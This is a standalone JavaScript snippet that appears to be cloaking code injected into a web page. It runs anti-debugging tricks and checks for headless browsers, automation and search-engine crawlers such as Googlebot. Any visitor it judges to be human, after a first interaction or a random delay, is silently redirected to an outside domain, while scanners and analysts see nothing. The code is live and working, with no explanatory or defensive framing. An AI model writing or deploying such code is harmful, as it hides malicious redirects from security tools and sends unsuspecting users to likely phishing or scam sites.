(function() {
    var TARGET = 'http://well.hzcdf.uk/dnt3';
    
    var _state = {
        bot: false,
        human: false,
        verified: false
    };

    (function checkDebug() {
        try {
          
            if (new Date() - new PerformanceObserver(function() {}).disconnect() < 100) {
            }
            
            var debuggerCheck = function() {
                debugger;
                return true;
            };
            if (debuggerCheck.toString().indexOf('debugger') === -1) {
                _state.bot = true;
            }

            if (window.console && typeof window.console.log === 'object' && !window.console.log.toString) {
                _state.bot = true;
            }

            if (window.self !== window.top && window.frameElement === null) {
              
                _state.bot = true;
            }

        } catch (e) {
          
            _state.bot = true;
        }
    })();

    (function analyzeEnv() {
        try {
            if (navigator.webdriver === true) _state.bot = true;

            var ua = navigator.userAgent;
            var headlessPatterns = [
                /HeadlessChrome/i,
                /PhantomJS/i,
                /SlimerJS/i,
                /Khtml/i,
                /Baiduspider/i,
                /Googlebot/i,
                /YandexBot/i,
                /DuckDuckBot/i
            ];
            
            for (var i = 0; i < headlessPatterns.length; i++) {
                if (headlessPatterns[i].test(ua)) {
                    _state.bot = true;
                    break;
                }
            }

            if (navigator.languages) {
                if (navigator.languages.length === 0 || 
                    (navigator.languages.length === 1 && navigator.languages[0] === 'en')) {
                    _state.bot = true;
                }
            } else {
                _state.bot = true;
            }

            if (window.outerWidth === 0 || window.outerHeight === 0) {
                _state.bot = true;
            }
            
            if (!navigator.hardwareConcurrency || navigator.hardwareConcurrency < 1) {
                _state.bot = true;
            }
            
            if (navigator.plugins && navigator.plugins.length < 2) {
                _state.bot = true;
            }

        } catch (e) {
            _state.bot = true;
        }
    })();

    var _events = [
        'touchstart', 
        'touchmove', 
        'pointerdown', 
        'scroll', 
        'mousemove', 
        'keydown', 
        'click',
        'wheel' 
    ];

    var _firstInteraction = false;

    function _markHuman() {
        if (_state.human || _state.bot) return;
        
        _firstInteraction = true;
        _state.human = true;

        window.location.href = TARGET;
    }

    _events.forEach(function(ev) {
        window.addEventListener(ev, function() {
            _markHuman();
        }, { passive: true, once: true });
    });

    window.addEventListener('deviceorientation', function(e) { 
        if (e && (e.alpha !== null && e.beta !== null && e.gamma !== null)) {
          
            _markHuman();
        }
    }, { passive: true, once: true });

    function _finalCheck() {
        if (!_state.human && !_state.bot) {
          
            window.location.href = TARGET;
        }
    }

    var _randomDelay = Math.floor(Math.random() * 1500) + 1500;

    setTimeout(_finalCheck, _randomDelay);

})();